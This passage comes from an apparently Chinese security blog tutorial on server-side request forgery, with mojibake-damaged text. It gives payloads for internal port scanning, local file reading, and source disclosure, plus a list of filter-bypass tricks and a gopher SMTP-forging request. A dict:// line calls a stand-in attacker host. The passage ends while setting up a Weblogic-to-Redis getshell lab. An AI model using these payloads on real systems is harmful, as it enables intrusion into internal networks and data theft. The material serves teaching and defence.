ä¸ºsslåè®®ä¼šæ¶‰åŠåˆ°å¯†é’¥åå•†ç­‰ç¯èŠ‚ï¼Œç®€å•çš„curlå®ç°å¯èƒ½æ— æ³•æ»¡è¶³è¦æ±‚ã€‚</p><ul><li>æœåŠ¡å™¨å‘é€URLè¯·æ±‚:</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//192.168.33.4/SSRF/getresource.php?url=http://www.baidu.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%889.47.53.png" style="zoom:55%;"><ul><li>æœåŠ¡å™¨è®¿é—®äº’è”ç½‘ä¸Šçš„å›¾ç‰‡èµ„æº:</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.33.4/SSRF/getresource.php?url<span class="token operator">=</span>http://pic.baike.soso.com/p/20140708/20140708112645-656251010.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»¥æºä»£ç çš„æ–¹å¼æ˜¾ç¤ºäº†å›¾ç‰‡èµ„æº:</p><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%889.57.02.png" style="zoom:55%;"><p>åœ¨æœåŠ¡å™¨ç«¯ä¿®æ”¹åç¼€åï¼Œæ­£å¸¸æ˜¾ç¤ºå›¾ç‰‡:</p><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%889.58.20.png" style="zoom:30%;"> </blockquote><h1 id="ä¸‰ã€SSRFæ¼æ´åˆ©ç”¨"><a href="#ä¸‰ã€SSRFæ¼æ´åˆ©ç”¨" class="headerlink" title="ä¸‰ã€SSRFæ¼æ´åˆ©ç”¨"></a>ä¸‰ã€SSRFæ¼æ´åˆ©ç”¨</h1><h2 id="3-1-è®¿é—®æ­£å¸¸æ–‡ä»¶ï¼ˆhttpã€gopherï¼‰"><a href="#3-1-è®¿é—®æ­£å¸¸æ–‡ä»¶ï¼ˆhttpã€gopherï¼‰" class="headerlink" title="3.1 è®¿é—®æ­£å¸¸æ–‡ä»¶ï¼ˆhttpã€gopherï¼‰"></a>3.1 è®¿é—®æ­£å¸¸æ–‡ä»¶ï¼ˆhttpã€gopherï¼‰</h2><p>è®¿é—®æ­£å¸¸æ–‡ä»¶ï¼Œæäº¤å‚æ•°<code>[?url=http://www.baidu.com/robots.txt]</code></p><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%8810.00.57.png" style="zoom:75%;"><p>ä¸‡é‡‘æ²¹åè®®ï¼šgopherã€‚</p><blockquote><h4 id="gopheråè®®"><a href="#gopheråè®®" class="headerlink" title="gopheråè®®"></a>gopheråè®®</h4><p>Gopheråè®®æ˜¯ä»€ä¹ˆï¼Ÿå®ƒæ˜¯ä¸€ä¸ªæ—©æœŸçš„äº’è”ç½‘åè®®ï¼Œä¸»è¦ç”¨äºæ–‡æ¡£çš„æ£€ç´¢å’Œä¼ è¾“ï¼Œç±»ä¼¼äºæ—©æœŸçš„HTTPã€‚ä¸è¿‡ï¼Œç°åœ¨å·²ç»è¢«HTTPå–ä»£ï¼Œä½¿ç”¨å¾—å¾ˆå°‘äº†ã€‚ä½†ä½œä¸ºç½‘ç»œå®‰å…¨å·¥ç¨‹å¸ˆï¼Œäº†è§£Gopherå¯èƒ½æœ‰å…¶ç‰¹å®šçš„æ„ä¹‰ï¼Œæ¯”å¦‚åœ¨æŸäº›æ”»å‡»åœºæ™¯ä¸­è¢«åˆ©ç”¨ï¼Œæ¯”å¦‚SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ”»å‡»ä¸­ï¼Œå› ä¸ºGopheråè®®å¯ä»¥æ„é€ ç‰¹å®šçš„è¯·æ±‚ï¼Œå¯èƒ½è¢«ç”¨æ¥æ”»å‡»å†…ç½‘æœåŠ¡ã€‚</p></blockquote><h2 id="3-2-ç«¯å£æ‰«æ-å¯ä»¥æ‰«æå†…ç½‘çš„ç«¯å£-ï¼ˆdict-ï¼‰"><a href="#3-2-ç«¯å£æ‰«æ-å¯ä»¥æ‰«æå†…ç½‘çš„ç«¯å£-ï¼ˆdict-ï¼‰" class="headerlink" title="3.2 ç«¯å£æ‰«æ(å¯ä»¥æ‰«æå†…ç½‘çš„ç«¯å£)ï¼ˆdict://ï¼‰"></a>3.2 ç«¯å£æ‰«æ(å¯ä»¥æ‰«æå†…ç½‘çš„ç«¯å£)ï¼ˆdict://ï¼‰</h2><p>å½“è®¿é—®æœªå¼€æ”¾ç«¯å£ï¼Œè„šæœ¬ä¼šæ˜¾ç¤ºç©ºç™½æˆ–è€…æŠ¥é”™ï¼Œæäº¤å‚æ•°<code>[?url=dict://127.0.0.1:1234]</code></p><p>å½“è®¿é—®å¼€æ”¾ç«¯å£æ—¶ï¼Œè„šæœ¬ä¼šæ˜¾ç¤ºbannner ä¿¡æ¯ã€‚</p><ul><li>[?url=dict://127.0.0.1:80]</li></ul><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%8810.12.50.png" style="zoom:55%;"><ul><li>[?url=dict://127.0.0.1:3306]</li></ul><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%8810.13.26.png" style="zoom:75%;"><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%8810.14.46.png" style="zoom:75%;"><blockquote><h4 id="dict-åè®®"><a href="#dict-åè®®" class="headerlink" title="dict://åè®®"></a>dict://åè®®</h4><p><code>dict://</code> åè®®æ˜¯å­—å…¸æœåŠ¡å™¨åè®®ï¼ˆDICTï¼‰çš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯ä¸€ç§åŸºäº TCP çš„äº‹åŠ¡å‹æŸ¥è¯¢/å“åº”åè®®ï¼Œå…è®¸å®¢æˆ·ç«¯ä»ä¸€ç»„è‡ªç„¶è¯­è¨€å­—å…¸æ•°æ®åº“ä¸­è®¿é—®å­—å…¸å®šä¹‰ã€‚</p><p>åœ¨SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ¼æ´åˆ©ç”¨åœºæ™¯ä¸­ï¼Œ<code>dict://</code> åè®®å¯ä»¥ç”¨æ¥æ¢æµ‹ç«¯å£æ˜¯å¦å¼€æ”¾ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p><p>1ï¼‰åè®®ç‰¹æ€§</p><ul><li><strong>åŸºäºTCP</strong>ï¼š<code>dict://</code> åè®®æ˜¯åŸºäºTCPçš„ï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥ä¸ç›®æ ‡ç«¯å£å»ºç«‹TCPè¿æ¥ã€‚å¦‚æœç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œ<code>dict://</code> åè®®çš„è¯·æ±‚èƒ½å¤ŸæˆåŠŸåˆ°è¾¾ç›®æ ‡ç«¯å£ï¼Œä»è€Œè§¦å‘ç›®æ ‡æœåŠ¡çš„å“åº”ã€‚</li><li><strong>å“åº”æœºåˆ¶</strong>ï¼šå½“<code>dict://</code> åè®®è¯·æ±‚åˆ°è¾¾ç›®æ ‡ç«¯å£æ—¶ï¼Œå¦‚æœç«¯å£ä¸Šæœ‰æœåŠ¡æ­£åœ¨ç›‘å¬ï¼Œè¯¥æœåŠ¡ä¼šè¿”å›å“åº”æ•°æ®ã€‚é€šè¿‡åˆ†æè¿™äº›å“åº”æ•°æ®ï¼Œæ”»å‡»è€…å¯ä»¥åˆ¤æ–­ç›®æ ‡ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚</li></ul><p>2ï¼‰SSRFæ¼æ´åˆ©ç”¨ä¸­çš„ä½œç”¨</p><ul><li><strong>æ¢æµ‹å†…ç½‘ç«¯å£</strong>ï¼šåœ¨SSRFæ¼æ´åˆ©ç”¨ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨<code>dict://</code> åè®®å‘ç›®æ ‡å†…ç½‘çš„ç‰¹å®šç«¯å£å‘é€è¯·æ±‚ã€‚å¦‚æœç›®æ ‡ç«¯å£å¼€æ”¾ï¼Œæ”»å‡»è€…ä¼šæ”¶åˆ°å“åº”ï¼Œä»è€Œç¡®è®¤è¯¥ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚</li><li><strong>ç»•è¿‡é™åˆ¶</strong>ï¼š<code>dict://</code> åè®®ç›¸å¯¹è¾ƒå°‘è¢«ä½¿ç”¨ï¼Œå› æ­¤ä¸€äº›å®‰å…¨é˜²æŠ¤æªæ–½å¯èƒ½æ²¡æœ‰é’ˆå¯¹è¯¥åè®®è¿›è¡Œä¸¥æ ¼çš„é™åˆ¶ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œé€šè¿‡<code>dict://</code> åè®®ç»•è¿‡æŸäº›å®‰å…¨é˜²æŠ¤ï¼Œæ¢æµ‹å†…ç½‘ç«¯å£ã€‚</li></ul></blockquote><h2 id="3-3-è¯»å–ç³»ç»Ÿæœ¬åœ°æ–‡ä»¶ï¼ˆfile-ï¼‰"><a href="#3-3-è¯»å–ç³»ç»Ÿæœ¬åœ°æ–‡ä»¶ï¼ˆfile-ï¼‰" class="headerlink" title="3.3 è¯»å–ç³»ç»Ÿæœ¬åœ°æ–‡ä»¶ï¼ˆfile://ï¼‰"></a>3.3 è¯»å–ç³»ç»Ÿæœ¬åœ°æ–‡ä»¶ï¼ˆfile://ï¼‰</h2><p>åˆ©ç”¨fileåè®®å¯ä»¥ä»»æ„è¯»å–æœ¬åœ°ç³»ç»Ÿæ–‡ä»¶ï¼Œæäº¤å‚æ•°ï¼š</p><ul><li>[?url=file://c:\windows\system32\drivers\etc\hosts]</li></ul><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%8810.16.29.png" style="zoom:50%;"><h2 id="3-4-å†…ç½‘Web-åº”ç”¨æŒ‡çº¹è¯†åˆ«"><a href="#3-4-å†…ç½‘Web-åº”ç”¨æŒ‡çº¹è¯†åˆ«" class="headerlink" title="3.4 å†…ç½‘Web åº”ç”¨æŒ‡çº¹è¯†åˆ«"></a>3.4 å†…ç½‘Web åº”ç”¨æŒ‡çº¹è¯†åˆ«</h2><p>è¯†åˆ«å†…ç½‘åº”ç”¨ä½¿ç”¨çš„æ¡†æ¶ï¼Œå¹³å°ï¼Œæ¨¡å—ä»¥åŠCMS å¯ä»¥ä¸ºåç»­çš„æ¸—é€æµ‹è¯•æä¾›å¾ˆå¤šçš„å¸®åŠ©ã€‚å¤§å¤šæ•°Web åº”ç”¨æ¡†æ¶éƒ½æœ‰ä¸€äº›ç‹¬ç‰¹çš„æ–‡ä»¶å’Œç›®å½•ã€‚é€šè¿‡è¿™äº›æ–‡ä»¶å¯ä»¥è¯†åˆ«å‡ºåº”ç”¨çš„ç±»å‹ï¼Œç”šè‡³è¯¦ç»†çš„ç‰ˆæœ¬ã€‚æ ¹æ®è¿™äº›ä¿¡æ¯å°±å¯ä»¥é’ˆå¯¹æ€§çš„æœé›†æ¼æ´è¿›è¡Œæ”»å‡»ã€‚ </p><p>æ¯”å¦‚å¯ä»¥é€šè¿‡è®¿é—®ä¸‹åˆ—æ–‡ä»¶æ¥åˆ¤æ–­phpMyadmin æ˜¯å¦å®‰è£…ä»¥åŠè¯¦ç»†ç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?url<span class="token operator">=</span>http://192.168.33.4/phpmyadmin/README<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%8810.18.21.png" style="zoom:75%;"><h2 id="3-5-æ”»å‡»å†…ç½‘åº”ç”¨"><a href="#3-5-æ”»å‡»å†…ç½‘åº”ç”¨" class="headerlink" title="3.5 æ”»å‡»å†…ç½‘åº”ç”¨"></a>3.5 æ”»å‡»å†…ç½‘åº”ç”¨</h2><p>å†…ç½‘å®‰å…¨é€šå¸¸éƒ½å¾ˆè–„å¼±ï¼Œæº¢å‡ºã€å¼±å£ä»¤ç­‰ä¸€èˆ¬éƒ½æ˜¯å­˜åœ¨çš„ã€‚é€šè¿‡ssrf æ”»å‡»ï¼Œå¯ä»¥å®ç°å¯¹å†…ç½‘çš„è®¿é—®ï¼Œä»è€Œå¯ä»¥æ”»å‡»å†…ç½‘åº”ç”¨æˆ–è€…æœ¬åœ°æœºå™¨ï¼Œè·å¾—shell,è¿™é‡Œçš„åº”ç”¨åŒ…æ‹¬æœåŠ¡ã€Web åº”ç”¨ã€‚</p><p>ä»…ä»…é€šè¿‡get æ–¹æ³•å¯ä»¥æ”»å‡»çš„Web åº”ç”¨æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚structs2 å‘½ä»¤æ‰§è¡Œç­‰ã€‚</p><h2 id="3-6-ä½¿ç”¨php-filterä¼ªåè®®è¯»å–æºä»£ç "><a href="#3-6-ä½¿ç”¨php-filterä¼ªåè®®è¯»å–æºä»£ç " class="headerlink" title="3.6 ä½¿ç”¨php://filterä¼ªåè®®è¯»å–æºä»£ç "></a>3.6 ä½¿ç”¨php://filterä¼ªåè®®è¯»å–æºä»£ç </h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.220.143:8888/sec/ssrf.php?url<span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>ssrf.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="å››ã€SSRFæ¼æ´çš„æŒ–æ˜"><a href="#å››ã€SSRFæ¼æ´çš„æŒ–æ˜" class="headerlink" title="å››ã€SSRFæ¼æ´çš„æŒ–æ˜"></a>å››ã€SSRFæ¼æ´çš„æŒ–æ˜</h1><p>å¯¹å¤–å‘èµ·ç½‘ç»œè¯·æ±‚çš„åœ°æ–¹éƒ½å¯èƒ½å­˜åœ¨SSRF æ¼æ´ï¼Œåˆ—ä¸¾å›¾ç‰‡åŠ è½½ä¸‹è½½ï¼Œåˆ†äº«é¡µé¢ï¼Œåœ¨çº¿ç¿»è¯‘ï¼Œæœªå…¬å¼€api(ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æºæ–‡ä»¶å¤„ç†ï¼Œç¼–ç å¤„ç†ï¼Œå±æ€§ä¿¡æ¯å¤„ç†ç­‰ã€‚)</p><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%8810.21.04.png" style="zoom:75%;"><h1 id="äº”ã€SSRFçš„é˜²å¾¡"><a href="#äº”ã€SSRFçš„é˜²å¾¡" class="headerlink" title="äº”ã€SSRFçš„é˜²å¾¡"></a>äº”ã€SSRFçš„é˜²å¾¡</h1><p>@ é™åˆ¶åè®®ï¼šä»…å…è®¸httpå’Œhttpsè¯·æ±‚ã€‚</p><p>@ é™åˆ¶IPï¼šé¿å…åº”ç”¨è¢«ç”¨æ¥è·å–å†…ç½‘æ•°æ®ï¼Œæ”»å‡»å†…ç½‘ã€‚</p><p>@ é™åˆ¶ç«¯å£ï¼šé™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºhttp å¸¸ç”¨çš„ç«¯å£ï¼Œä¾‹å¦‚80 443 8080 8090</p><p>@ è¿‡æ»¤è¿”å›ä¿¡æ¯ï¼šéªŒè¯è¿œç¨‹æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å“åº”æ˜¯æ¯”è¾ƒç®€å•çš„æ–¹æ³•ã€‚</p><p>@ ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼šé¿å…ç”¨æˆ·å¯ä»¥æ ¹æ®é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç«¯æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€ã€‚</p><h1 id="å…­ã€SSRFé˜²å¾¡ç»•è¿‡æŠ€å·§"><a href="#å…­ã€SSRFé˜²å¾¡ç»•è¿‡æŠ€å·§" class="headerlink" title="å…­ã€SSRFé˜²å¾¡ç»•è¿‡æŠ€å·§"></a>å…­ã€SSRFé˜²å¾¡ç»•è¿‡æŠ€å·§</h1><h2 id="6-0-æœ¬åœ°åœ°å€"><a href="#6-0-æœ¬åœ°åœ°å€" class="headerlink" title="6.0 æœ¬åœ°åœ°å€"></a>6.0 æœ¬åœ°åœ°å€</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://127.0.0.1:80http://localhost:22<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="6-1-åˆ©ç”¨-ç¬¦å·"><a href="#6-1-åˆ©ç”¨-ç¬¦å·" class="headerlink" title="6.1 åˆ©ç”¨@ç¬¦å·"></a>6.1 åˆ©ç”¨@ç¬¦å·</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://example.com@127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-2-æ·»åŠ ç«¯å£å·"><a href="#6-2-æ·»åŠ ç«¯å£å·" class="headerlink" title="6.2 æ·»åŠ ç«¯å£å·"></a>6.2 æ·»åŠ ç«¯å£å·</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://127.0.0.1:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-3-åˆ©ç”¨çŸ­åœ°å€"><a href="#6-3-åˆ©ç”¨çŸ­åœ°å€" class="headerlink" title="6.3 åˆ©ç”¨çŸ­åœ°å€"></a>6.3 åˆ©ç”¨çŸ­åœ°å€</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://dwz.cn/11SMa  <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span>  http://127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-4-åˆ©ç”¨ç‰¹æ®ŠåŸŸå"><a href="#6-4-åˆ©ç”¨ç‰¹æ®ŠåŸŸå" class="headerlink" title="6.4 åˆ©ç”¨ç‰¹æ®ŠåŸŸå"></a>6.4 åˆ©ç”¨ç‰¹æ®ŠåŸŸå</h2><p>åˆ©ç”¨çš„åŸç†æ˜¯DNSè§£æ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://127.0.0.1.xip.io/http://www.owasp.org.127.0.0.1.xip.io/http://0/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åœ¨åŸŸåä¸Šè®¾ç½®Aè®°å½•ï¼ŒæŒ‡å‘127.0.1</p><h2 id="6-5-åˆ©ç”¨å°é—­å¼å­—æ¯æ•°å­—Enclosed-Alphanumerics"><a href="#6-5-åˆ©ç”¨å°é—­å¼å­—æ¯æ•°å­—Enclosed-Alphanumerics" class="headerlink" title="6.5 åˆ©ç”¨å°é—­å¼å­—æ¯æ•°å­—Enclosed Alphanumerics"></a>6.5 åˆ©ç”¨å°é—­å¼å­—æ¯æ•°å­—Enclosed Alphanumerics</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">åˆ©ç”¨Enclosed alphanumericsâ“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ  <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span>  example.comList:â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-6-åˆ©ç”¨ã€‚ç»•è¿‡"><a href="#6-6-åˆ©ç”¨ã€‚ç»•è¿‡" class="headerlink" title="6.6 åˆ©ç”¨ã€‚ç»•è¿‡"></a>6.6 åˆ©ç”¨ã€‚ç»•è¿‡</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127</span>ã€‚0ã€‚0ã€‚1  <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span>  <span class="token number">127.0</span>.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-7-åˆ©ç”¨è¿›åˆ¶è½¬æ¢"><a href="#6-7-åˆ©ç”¨è¿›åˆ¶è½¬æ¢" class="headerlink" title="6.7 åˆ©ç”¨è¿›åˆ¶è½¬æ¢"></a>6.7 åˆ©ç”¨è¿›åˆ¶è½¬æ¢</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">å¯ä»¥æ˜¯åå…­è¿›åˆ¶ï¼Œå…«è¿›åˆ¶ç­‰ã€‚<span class="token number">115.239</span>.210.26  <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span>  <span class="token number">16373751032</span>é¦–å…ˆæŠŠè¿™å››æ®µæ•°å­—ç»™åˆ†åˆ«è½¬æˆ16è¿›åˆ¶ï¼Œç»“æœï¼š73 ef d2 1aç„¶åæŠŠ 73efd21a è¿™åå…­è¿›åˆ¶ä¸€èµ·è½¬æ¢æˆ8è¿›åˆ¶è®°å¾—è®¿é—®çš„æ—¶å€™åŠ 0è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶<span class="token punctuation">(</span>å¯ä»¥æ˜¯ä¸€ä¸ª0ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª0<span class="token punctuation">)</span>ï¼Œåå…­è¿›åˆ¶åŠ 0x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://127.0.0.1  <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span>  http://0177.0.0.1/http://127.0.0.1  <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span>  http://2130706433/http://192.168.0.1  <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span>  http://3232235521/http://192.168.1.1  <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span>  http://3232235777/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-8-åˆ©ç”¨å…¶å®ƒåè®®"><a href="#6-8-åˆ©ç”¨å…¶å®ƒåè®®" class="headerlink" title="6.8 åˆ©ç”¨å…¶å®ƒåè®®"></a>6.8 åˆ©ç”¨å…¶å®ƒåè®®</h2><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/image-20250211143722330.png" style="zoom:80%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Dict://dict://<span class="token operator">&lt;</span>user-auth<span class="token operator">&gt;</span>@<span class="token operator">&lt;</span>host<span class="token operator">&gt;</span>:<span class="token operator">&lt;</span>port<span class="token operator">&gt;</span>/d:<span class="token operator">&lt;</span>word<span class="token operator">&gt;</span>ssrf.php?url<span class="token operator">=</span>dict://attacker:11111/SFTP://ssrf.php?url<span class="token operator">=</span>sftp://example.com:11111/TFTP://ssrf.php?url<span class="token operator">=</span>tftp://example.com:12346/TESTUDPPACKETLDAP://ssrf.php?url<span class="token operator">=</span>ldap://localhost:11211/%0astats%0aquitGopher://ssrf.php?url<span class="token operator">=</span>gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-9-åˆ©ç”¨"><a href="#6-9-åˆ©ç”¨" class="headerlink" title="6.9 åˆ©ç”¨[::]"></a>6.9 åˆ©ç”¨[::]</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">åˆ©ç”¨<span class="token punctuation">[</span>::<span class="token punctuation">]</span>ç»•è¿‡localhosthttp://<span class="token punctuation">[</span>::<span class="token punctuation">]</span>:80/  <span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span>  http://127.0.0.1ä¹Ÿæœ‰çœ‹åˆ°åˆ©ç”¨http://0000::1:80/çš„ï¼Œå¯ä»¥æµ‹è¯•æ˜¯å¦å¯è¡Œã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="å®æˆ˜â€”Weblogic-ä»ssrf-åˆ°getshell"><a href="#å®æˆ˜â€”Weblogic-ä»ssrf-åˆ°getshell" class="headerlink" title="å®æˆ˜â€”Weblogic ä»ssrf åˆ°getshell"></a>å®æˆ˜â€”Weblogic ä»ssrf åˆ°getshell</h1><p>weblogicä¸­å­˜åœ¨ä¸€ä¸ªSSRFæ¼æ´ï¼Œ åˆ©ç”¨è¯¥æ¼æ´å¯ä»¥å‘é€ä»»æ„HTTPè¯·æ±‚ï¼Œè¿›è€Œæ”»å‡»å†…ç½‘ä¸­redisã€fastcgi ç­‰è„†å¼±ç»„ä»¶ã€‚æ­¤å¤„æˆ‘ä»¬ä»¥vulhubä¸­çš„ä¸€ä¸ªç¯å¢ƒæ¥å¤ç°æ•´ä¸ªè¿‡ç¨‹ã€‚å¼€æºæ¸—é€æµ‹è¯•å¹³å°vulhubçš„è¯¦ç»†æ­å»ºè¿‡ç¨‹ï¼Œæˆ‘ä»¬ä¸åœ¨è¿™é‡Œèµ˜è¿°ã€‚</p><p>weblogic ssrf=&gt; redis æœªæˆæƒè®¿é—® =&gt; getshell</p><h2 id="1ï¼‰å¯åŠ¨ç¯å¢ƒ"><a href="#1ï¼‰å¯åŠ¨ç¯å¢ƒ" class="headerlink" title="1ï¼‰å¯åŠ¨ç¯å¢ƒ"></a>1ï¼‰å¯åŠ¨ç¯å¢ƒ</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span>  /home/sxk/Desktop/vulhub-test1/vulhub-master/weblogic/ssrf<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸‹è½½èµ„æºå¹¶å¯åŠ¨ç¯å¢ƒã€‚</p><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%8810.53.12.png" style="zoom:75%;"><p>ç¯å¢ƒæ­å»ºï¼šä¾èµ–äºdocker æŠ€æœ¯</p><p>docker-compose up -d å¯åŠ¨ä¸¤ä¸ªdocker é•œåƒ</p><p>docker ps æŸ¥çœ‹å¯åŠ¨çš„å®¹å™¨</p><img src="/2025/02/11/web-an-quan/fu-wu-duan-qing-qiu-wei-zao-lou-dong-ssrf/%E6%88%AA%E5%B1%8F2021-07-20%20%E4%B8%8A%E5%8D%8810.54.32.png" style="zoom:75%;"><p>docker exec -it dockeré•œåƒid â€œ/bin/bashâ€ ã€ç™»é™†dockeré•œåƒã€‘</p><img 